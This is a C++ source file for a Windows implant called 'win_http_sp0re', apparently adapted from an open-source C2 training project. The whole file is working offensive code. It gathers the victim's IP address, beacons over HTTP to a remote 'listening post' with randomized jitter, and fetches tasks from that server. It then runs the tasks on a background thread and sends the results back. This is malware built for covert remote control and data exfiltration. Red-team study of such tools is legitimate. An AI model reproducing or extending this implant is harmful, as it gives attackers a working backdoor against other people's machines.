/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * The original author of this code is Josh Lospinoso (@jalospinoso).
 * The unmodified source code can be found here: https://github.com/JLospinoso/cpp-implant
*/
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"
#include "tasks.h"

#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "IPHLPAPI.lib")

#include <nlohmann/json.hpp>

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

using json = nlohmann::json;

// Function to return the ip address
std::string getIPAddr() {
    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;

    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL) {
        return "Error allocating memory needed to call GetAdaptersinfo";
    }
    // Make an initial call to GetAdaptersInfo to get
    // the necessary size into the ulOutBufLen variable
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        FREE(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            return "Error allocating memory needed to call GetAdaptersinfo";
        }
    }
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
        pAdapter = pAdapterInfo;
        std::string ipaddr = pAdapter->IpAddressList.IpAddress.String;
        if (pAdapterInfo)
            FREE(pAdapterInfo);
        return ipaddr;
    }
    else {
        if (pAdapterInfo)
            FREE(pAdapterInfo);
        return "GetAdaptersInfo failed with error: " + dwRetVal;
    }
}

// Function to send an asynchronous HTTP POST request with a payload to the listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload) {
    // Set all our request constants
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const httpVersion = 11;
    auto const requestBody = json::parse(payload);

    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    // Make an asynchronous HTTP POST request to the listening post
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {"Content-Type", "application/json"} }
    );
    // Retrieve the response when it's ready
    cpr::Response response = asyncRequest.get();

    // Show the request contents
    std::cout << "Request body: " << requestBody << std::endl;

    // Return the body of the response from the listening post, may include new tasks
    return response.text;
};


// Initialize variables for our object
Implant::Implant(std::string host, std::string port, std::string uri) :
    // Listening post endpoint URL arguments
    host{ std::move(host) },
    port{ std::move(port) },
    uri{ std::move(uri) },
    // Options for configuration settings
    isRunning{ true },
    dwellDistributionSeconds{ 1. },
    agent_id{ "MA==" },
    // Thread that runs all our tasks, performs asynchronous I/O
    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
}


// Method to enable/disable the running status on our implant
void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }


// Method to set the mean dwell time on our implant
void Implant::setMeanDwell(double meanDwell) {
    // Exponential_distribution allows random jitter generation
    dwellDistributionSeconds = std::exponential_distribution<double>(2. / meanDwell);
}


// Method to set a unique agent id for each instance of the implant
void Implant::setAgentID(std::string agentID) { agent_id = agentID; }


// Method to start beaconing to the listening post
void Implant::beacon() {
    while (isRunning) {
        // Try to contact the listening post and send results/get back tasks
        // Then, if tasks were received, parse and store them for execution
        // Tasks stored will be serviced by the task thread asynchronously
        try {
            std::cout << "win_http_sp0re is sending results to listening post...\n" << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nListening post response content: " << serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            parseTasks(serverResponse);
            std::cout << "\n================================================\n" << std::endl;
        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
        }
        // Sleep for a set duration with jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };

        if (agent_id == "MA==") { std::this_thread::sleep_for(std::chrono::seconds{2}); }
        std::this_thread::sleep_for(sleepTimeChrono);
    }
    std::cout << "win_http_sp0re has been killed. Sending final results back to listening post...\n";
    std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    const auto serverResponse = sendResults();
}


// Method to send task results and receive new tasks
[[nodiscard]] std::string Implant::sendResults() {
    // Local results variable
    boost::property_tree::ptree resultsLocal;
    // A scoped lock to perform a swap
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    // Format result contents
    std::stringstream resultsStringStream;
    resultsLocal.add("agent_id", agent_id);
    if (agent_id == "MA==") {
        resultsLocal.add("ip_address", getIPAddr());
    }
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    // Contact listening post with results and return any tasks received
    return sendHttpRequest(host, port, uri, resultsStringStream.str());
}


// Method to parse tasks received from listening post
void Implant::parseTasks(const std::string& response) {
    // Local response variable
    std::stringstream responseStringStream{ response };

    // Read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    // Range based for-loop to parse tasks and push them into the tasks vector
    // Once this is done, the tasks are ready to be serviced by the implant
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        // Ensure that each task is meant for this agent by checking if this agent's id is in the task object, or assume initialization
        if (taskTreeValue.get_child("agent_id").get_value<std::string>() == agent_id || agent_id == "MA==")
        // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning);
                    setAgentID(configuration.agent_id); })
            );
        }
        else {
            std::cout << "\nRetrieved task for other agent.\nNot executing." << std::endl;
            std::cout << "\n================================================\n" << std::endl;
        }
    }
}


// Loop and go through the tasks received from the listening post, then service them
void Implant::serviceTasks() {
    while (isRunning) {
        // Local tasks variable
        std::vector<Task> localTasks;
        // Scoped lock to perform a swap
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex };
            tasks.swap(localTasks);
        }
        // Range based for-loop to call the run() method on each task and add the results of tasks
        for (const auto& task : localTasks) {
            // Call run() on each task and we'll get back values for id, contents and success
            const auto [id, agent_id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
            // Scoped lock to add task results
            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        // Go to sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}
